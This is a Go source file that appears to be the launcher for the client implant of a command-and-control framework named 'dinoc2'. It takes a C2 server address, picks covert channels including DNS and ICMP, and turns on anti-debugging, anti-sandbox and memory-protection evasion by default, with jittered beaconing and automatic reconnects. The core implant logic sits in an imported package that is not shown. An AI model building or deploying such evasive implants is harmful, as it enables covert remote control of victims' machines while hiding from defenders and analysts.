package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"dinoc2/pkg/client"
)

func main() {
	// Parse command line flags
	serverAddr := flag.String("server", "", "C2 server address")
	protocolList := flag.String("protocol", "tcp", "Comma-separated list of protocols to use (tcp,dns,icmp,http,websocket)")
	enableAntiDebug := flag.Bool("anti-debug", true, "Enable anti-debugging measures")
	enableAntiSandbox := flag.Bool("anti-sandbox", true, "Enable anti-sandbox measures")
	enableMemProtect := flag.Bool("mem-protect", true, "Enable memory protection")
	heartbeatInterval := flag.Int("heartbeat", 30, "Heartbeat interval in seconds")
	reconnectInterval := flag.Int("reconnect", 5, "Reconnect interval in seconds")
	flag.Parse()

	if *serverAddr == "" {
		fmt.Println("Error: Server address is required")
		flag.Usage()
		os.Exit(1)
	}

	// Parse protocol list
	protocols := parseProtocols(*protocolList)
	if len(protocols) == 0 {
		fmt.Println("Error: At least one valid protocol must be specified")
		flag.Usage()
		os.Exit(1)
	}

	// Create client configuration
	config := &client.ClientConfig{
		ServerAddress:     *serverAddr,
		Protocols:         protocols,
		HeartbeatInterval: time.Duration(*heartbeatInterval) * time.Second,
		ReconnectInterval: time.Duration(*reconnectInterval) * time.Second,
		MaxRetries:        5,
		JitterEnabled:     true,
		JitterRange:       [2]time.Duration{100 * time.Millisecond, 1 * time.Second},
		EnableAntiDebug:   *enableAntiDebug,
		EnableAntiSandbox: *enableAntiSandbox,
		EnableMemProtect:  *enableMemProtect,
	}

	// Create client
	c, err := client.NewClient(config)
	if err != nil {
		fmt.Printf("Error creating client: %v\n", err)
		os.Exit(1)
	}

	// Start client
	err = c.Start()
	if err != nil {
		fmt.Printf("Error starting client: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("C2 Client started. Connected to server:", *serverAddr)
	fmt.Println("Using protocols:", *protocolList)

	// Setup signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// Wait for termination signal
	<-sigChan
	fmt.Println("\nShutting down client...")
	
	// Stop client
	err = c.Stop()
	if err != nil {
		fmt.Printf("Error stopping client: %v\n", err)
	}
	
	fmt.Println("Client shutdown complete.")
}

// parseProtocols converts a comma-separated protocol list to a slice of ProtocolType
func parseProtocols(protocolList string) []client.ProtocolType {
	var protocols []client.ProtocolType
	
	// Split the protocol list
	parts := strings.Split(protocolList, ",")
	
	// Convert each part to a ProtocolType
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		
		switch strings.ToLower(part) {
		case "tcp":
			protocols = append(protocols, client.ProtocolTCP)
		case "dns":
			protocols = append(protocols, client.ProtocolDNS)
		case "icmp":
			protocols = append(protocols, client.ProtocolICMP)
		case "http":
			protocols = append(protocols, client.ProtocolHTTP)
		case "websocket":
			protocols = append(protocols, client.ProtocolWebSocket)
		default:
			fmt.Printf("Warning: Unknown protocol '%s', ignoring\n", part)
		}
	}
	
	return protocols
}
